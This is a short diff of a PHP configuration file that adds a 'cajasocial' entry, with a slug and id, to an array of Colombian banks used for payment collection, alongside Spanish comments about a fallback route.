@@ -31,6 +31,7 @@ return [
          'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
 //        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
    'davivienda' => ['slug' => 'dv', 'id' => '4c3a6a204bd92c4c33690c3c'], 
+    'cajasocial' => ['slug' => 'cj', 'id' => 'e795be1af0a0e791176cc511'], 
     ],
 
     // Bancos disponibles para recaudofall (nombre interno => etiqueta externa)
